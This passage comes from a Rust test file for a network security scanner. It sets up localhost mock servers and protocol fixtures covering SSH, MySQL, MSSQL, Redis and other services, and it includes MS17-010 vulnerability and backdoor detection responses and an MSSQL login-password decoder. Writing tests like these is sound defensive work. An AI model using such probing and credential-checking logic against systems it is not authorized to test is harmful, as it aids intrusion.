    assert_eq!(executed.load(Ordering::SeqCst), 1);
    assert_eq!(findings.len(), 1);
}

#[test]
fn continues_after_individual_service_task_errors() {
    let tasks = vec![
        ServiceScanTask {
            plugin_key: "ssh",
            target: OpenService {
                host: "127.0.0.1".to_string(),
                port: 2222,
            },
        },
        ServiceScanTask {
            plugin_key: "memcached",
            target: OpenService {
                host: "127.0.0.1".to_string(),
                port: 11211,
            },
        },
    ];

    let findings = execute_service_scan_tasks(
        tasks,
        &ServiceRuntimeBundle {
            service: ServiceScanRuntimeOptions {
                module_threads: 1,
                global_timeout_secs: 2,
                log_errors: false,
            },
            ..ServiceRuntimeBundle::default()
        },
        |task, _runtime| {
            if task.plugin_key == "ssh" {
                anyhow::bail!("ssh password authentication failed");
            }

            Ok(Some(PluginFinding {
                plugin: task.plugin_key.to_string(),
                target: task.target.clone(),
                status: "unauthorized-access".to_string(),
                details: BTreeMap::new(),
            }))
        },
    )
    .expect("task execution should continue after plugin errors");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "memcached");
}

fn snmp_test_response(community: &str, system: &str) -> Vec<u8> {
    let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
    let varbind = ber_tlv(
        0x30,
        &[ber_tlv(0x06, &oid), ber_octet_string(system.as_bytes())].concat(),
    );
    let varbinds = ber_tlv(0x30, &varbind);
    let pdu = ber_tlv(
        0xa2,
        &[ber_integer(1), ber_integer(0), ber_integer(0), varbinds].concat(),
    );
    ber_tlv(
        0x30,
        &[ber_integer(1), ber_octet_string(community.as_bytes()), pdu].concat(),
    )
}

fn respond_neo4j_handshake(stream: &mut TcpStream, success: bool) -> Result<()> {
    let mut handshake = [0u8; 20];
    stream
        .read_exact(&mut handshake)
        .expect("handshake should read");
    stream
        .write_all(&[0x00, 0x00, 0x04, 0x04])
        .expect("version should write");

    let message = neo4j_read_message(stream)?;
    let as_text = String::from_utf8_lossy(&message);
    if success {
        stream
            .write_all(&neo4j_chunk_message(&[0xB1, 0x70, 0xA0]))
            .expect("success frame should write");
    } else {
        assert!(as_text.contains("scheme"));
        stream
            .write_all(&neo4j_chunk_message(&[0xB1, 0x7F, 0xA0]))
            .expect("failure frame should write");
    }
    Ok(())
}

fn mysql_handshake() -> Vec<u8> {
    let mut payload = Vec::new();
    payload.push(0x0a);
    payload.extend_from_slice(b"8.0.36\0");
    payload.extend_from_slice(&1u32.to_le_bytes());
    payload.extend_from_slice(b"12345678");
    payload.push(0x00);
    payload.extend_from_slice(&0xffffu16.to_le_bytes());
    payload.push(0x21);
    payload.extend_from_slice(&0x0002u16.to_le_bytes());
    payload.extend_from_slice(&0x0008u16.to_le_bytes());
    payload.push(21);
    payload.extend_from_slice(&[0u8; 10]);
    payload.extend_from_slice(b"abcdefghijklm");
    payload.push(0x00);
    payload.extend_from_slice(b"mysql_native_password\0");
    payload
}

fn postgres_read_startup(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut header = [0u8; 4];
    stream
        .read_exact(&mut header)
        .context("failed to read postgres startup header")?;
    let length = u32::from_be_bytes(header) as usize;
    let mut payload = vec![0u8; length.saturating_sub(4)];
    stream
        .read_exact(&mut payload)
        .context("failed to read postgres startup payload")?;
    Ok(payload)
}

fn postgres_server_message(tag: u8, payload: &[u8]) -> Vec<u8> {
    let mut message = Vec::with_capacity(payload.len() + 5);
    message.push(tag);
    message.extend_from_slice(&((payload.len() + 4) as u32).to_be_bytes());
    message.extend_from_slice(payload);
    message
}

fn kafka_response_frame(correlation_id: i32, body: &[u8]) -> Vec<u8> {
    let mut payload = Vec::with_capacity(body.len() + 4);
    payload.extend_from_slice(&correlation_id.to_be_bytes());
    payload.extend_from_slice(body);
    let mut frame = Vec::with_capacity(payload.len() + 4);
    frame.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    frame.extend_from_slice(&payload);
    frame
}

fn kafka_request_api_key(payload: &[u8]) -> Option<i16> {
    let bytes: [u8; 2] = payload.get(0..2)?.try_into().ok()?;
    Some(i16::from_be_bytes(bytes))
}

fn findnet_test_payload(hostname: &str, addresses: &[&str]) -> Vec<u8> {
    let mut payload = utf16le_bytes(hostname);
    payload.extend_from_slice(&[0, 0]);
    for address in addresses {
        payload.extend_from_slice(b"\x07\x00");
        payload.extend_from_slice(address.as_bytes());
        payload.extend_from_slice(&[0, 0, 0]);
    }
    payload.extend_from_slice(&[0, 0, 0, 0]);
    payload.extend_from_slice(FINDNET_END_MARKER);
    payload
}

fn utf16le_bytes(value: &str) -> Vec<u8> {
    value
        .encode_utf16()
        .flat_map(|unit| unit.to_le_bytes())
        .collect()
}

fn write_test_ssh_key(prefix: &str) -> PathBuf {
    let nonce = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("system time should be after unix epoch")
        .as_nanos();
    let path =
        std::env::temp_dir().join(format!("rscan-{prefix}-{}-{nonce}.key", std::process::id()));
    fs::write(&path, TEST_SSH_PRIVATE_KEY).expect("ssh private key should write");
    path
}

fn spawn_ssh_server(
    expected_sessions: usize,
    username: &'static str,
    password: Option<&'static str>,
    allow_publickey: bool,
) -> (u16, thread::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let handle = thread::spawn(move || {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("tokio runtime should build");
        let host_key = russh::keys::PrivateKey::from_openssh(TEST_SSH_PRIVATE_KEY)
            .expect("host key should parse");
        let authorized_key = host_key.public_key().clone();

        let mut config = russh::server::Config {
            keys: vec![host_key],
            ..Default::default()
        };
        config.auth_rejection_time = std::time::Duration::from_millis(10);
        config.auth_rejection_time_initial = Some(std::time::Duration::from_millis(10));
        let config = Arc::new(config);

        let mut served = 0usize;
        while served < expected_sessions {
            let (stream, _) = listener.accept().expect("connection should accept");
            stream
                .set_read_timeout(Some(std::time::Duration::from_millis(200)))
                .expect("probe timeout should set");
            let mut probe = [0u8; 4];
            let peeked = match stream.peek(&mut probe) {
                Ok(size) => size,
                Err(error)
                    if matches!(error.kind(), ErrorKind::WouldBlock | ErrorKind::TimedOut) =>
                {
                    continue;
                }
                Err(error) => panic!("failed to inspect ssh test connection: {error}"),
            };
            if peeked == 0 {
                continue;
            }

            stream
                .set_nonblocking(true)
                .expect("stream should become nonblocking");
            let session = runtime
                .block_on(async {
                    let stream =
                        tokio::net::TcpStream::from_std(stream).expect("tokio stream should wrap");
                    russh::server::run_stream(
                        config.clone(),
                        stream,
                        TestSshHandler {
                            username: username.to_string(),
                            password: password.map(ToString::to_string),
                            authorized_key: allow_publickey.then(|| authorized_key.clone()),
                        },
                    )
                    .await
                })
                .expect("ssh session should start");
            let _ = runtime.block_on(session);
            served += 1;
        }
    });

    (port, handle)
}

fn netbios_udp_response(domain: &str, host: &str) -> Vec<u8> {
    let mut response = vec![0u8; 57];
    response[56] = 2;
    let mut domain_entry = [b' '; 18];
    domain_entry[..domain.len().min(15)]
        .copy_from_slice(&domain.as_bytes()[..domain.len().min(15)]);
    domain_entry[15] = 0x00;
    domain_entry[16] = 0x80;
    let mut host_entry = [b' '; 18];
    host_entry[..host.len().min(15)].copy_from_slice(&host.as_bytes()[..host.len().min(15)]);
    host_entry[15] = 0x20;
    response.extend_from_slice(&domain_entry);
    response.extend_from_slice(&host_entry);
    response
}

fn netbios_ntlm_response() -> Vec<u8> {
    let target_info_length = 106usize;
    let mut response = vec![0u8; 47 + target_info_length];
    response[43] = target_info_length as u8;
    response[44] = (target_info_length >> 8) as u8;

    let start = 60usize;
    response[start..start + 7].copy_from_slice(b"NTLMSSP");
    response[start + 40] = 48;
    response[start + 41] = 0;
    response[start + 44] = 45;
    let items = [
        0x03, 0x00, 0x12, 0x00, b'D', 0, b'E', 0, b'S', 0, b'K', 0, b'T', 0, b'O', 0, b'P', 0,
        b'0', 0, b'1', 0, 0x04, 0x00, 0x12, 0x00, b'W', 0, b'O', 0, b'R', 0, b'K', 0, b'G', 0,
        b'R', 0, b'O', 0, b'U', 0, b'P', 0, 0x00, 0x00, 0x00, 0x00,
    ];
    let items_start = start + 45;
    response[items_start..items_start + items.len()].copy_from_slice(&items);
    response.extend_from_slice(&utf16le_bytes("Windows Server 2022|"));
    response
}

fn ms17010_negotiate_response() -> Vec<u8> {
    let mut response = vec![0u8; 36];
    response[4..8].copy_from_slice(b"SMB\x72");
    response
}

fn ms17010_session_response(user_id: [u8; 2], os: &str) -> Vec<u8> {
    let byte_count = os.len() + 2;
    let mut response = vec![0u8; 45 + byte_count];
    response[4..8].copy_from_slice(b"SMB\x73");
    response[32..34].copy_from_slice(&user_id);
    response[36] = 1;
    response[43..45].copy_from_slice(&(byte_count as u16).to_le_bytes());
    response[46..46 + os.len()].copy_from_slice(os.as_bytes());
    response
}

fn ms17010_tree_response(tree_id: [u8; 2]) -> Vec<u8> {
    let mut response = vec![0u8; 36];
    response[4..8].copy_from_slice(b"SMB\x75");
    response[28..30].copy_from_slice(&tree_id);
    response
}

fn ms17010_named_pipe_response(vulnerable: bool) -> Vec<u8> {
    let mut response = vec![0u8; 36];
    response[4..8].copy_from_slice(b"SMB\x25");
    if vulnerable {
        response[9..13].copy_from_slice(&[0x05, 0x02, 0x00, 0xC0]);
    }
    response
}

fn ms17010_backdoor_response(backdoor: bool) -> Vec<u8> {
    let mut response = vec![0u8; 36];
    response[4..8].copy_from_slice(b"SMB\x32");
    if backdoor {
        response[34] = 0x51;
    }
    response
}

fn ms17010_tree_connect_request_for(host: &str, user_id: [u8; 2]) -> Vec<u8> {
    ms17010_tree_connect_request(host, user_id)
}

fn ms17010_trans_named_pipe_request_for(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
    let mut request = ms17010_trans_named_pipe_request();
    request[28..30].copy_from_slice(&tree_id);
    request[32..34].copy_from_slice(&user_id);
    request
}

fn ms17010_trans2_session_setup_request_for(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
    let mut request = ms17010_trans2_session_setup_request();
    request[28..30].copy_from_slice(&tree_id);
    request[32..34].copy_from_slice(&user_id);
    request
}

fn read_netbios_message(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut header = [0u8; 4];
    stream.read_exact(&mut header)?;
    let length = ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | header[3] as usize;
    let mut body = vec![0u8; length];
    stream.read_exact(&mut body)?;
    let mut message = header.to_vec();
    message.extend_from_slice(&body);
    Ok(message)
}

fn ms17010_framed_response(
    command: u8,
    tree_id: [u8; 2],
    user_id: [u8; 2],
    extra: &[u8],
) -> Vec<u8> {
    let mut body = vec![0u8; 32];
    body[0..4].copy_from_slice(b"\xFFSMB");
    body[4] = command;
    body[24..26].copy_from_slice(&tree_id);
    body[28..30].copy_from_slice(&user_id);
    body.extend_from_slice(extra);
    let length = body.len() as u32;
    let mut packet = vec![0x00, 0x00, 0x00, 0x00];
    packet[1..4].copy_from_slice(&length.to_be_bytes()[1..4]);
    packet.extend_from_slice(&body);
    packet
}

fn mssql_login_ack_payload() -> Vec<u8> {
    vec![
        0xAD, 0x12, 0x00, 0x01, 0x74, 0x00, 0x00, 0x04, 0x05, b'r', 0, b's', 0, b'c', 0, b'a', 0,
        b'n', 0, 0x00, 0x00, 0x00, 0x00, 0xFD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
    ]
}

fn mssql_login_username(payload: &[u8]) -> Option<String> {
    mssql_login_field(payload, 40)
}

fn mssql_login_password(payload: &[u8]) -> Option<String> {
    let offset = u16::from_le_bytes(payload.get(44..46)?.try_into().ok()?) as usize;
    let len = u16::from_le_bytes(payload.get(46..48)?.try_into().ok()?) as usize;
    let bytes = payload.get(offset..offset + len * 2)?;
    let decoded = bytes
        .iter()
        .map(|byte| (byte ^ 0xA5).rotate_left(4))
        .collect::<Vec<_>>();
    let units = decoded
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect::<Vec<_>>();
    String::from_utf16(&units).ok()
}

fn mssql_login_field(payload: &[u8], offset_index: usize) -> Option<String> {
    let offset = u16::from_le_bytes(
        payload
            .get(offset_index..offset_index + 2)?
            .try_into()
            .ok()?,
    ) as usize;
    let len = u16::from_le_bytes(
        payload
            .get(offset_index + 2..offset_index + 4)?
            .try_into()
            .ok()?,
    ) as usize;
    let bytes = payload.get(offset..offset + len * 2)?;
    let units = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect::<Vec<_>>();
    String::from_utf16(&units).ok()
}

fn redis_read_command(stream: &mut TcpStream) -> std::io::Result<String> {
    stream
        .set_read_timeout(Some(std::time::Duration::from_millis(500)))
        .expect("read timeout should set");
    let mut buffer = Vec::new();
    let mut byte = [0u8; 1];
    loop {
        stream.read_exact(&mut byte)?;
        buffer.push(byte[0]);
        if byte[0] == b'\n' {
            break;
        }
    }
    Ok(String::from_utf8_lossy(&buffer).to_string())
}
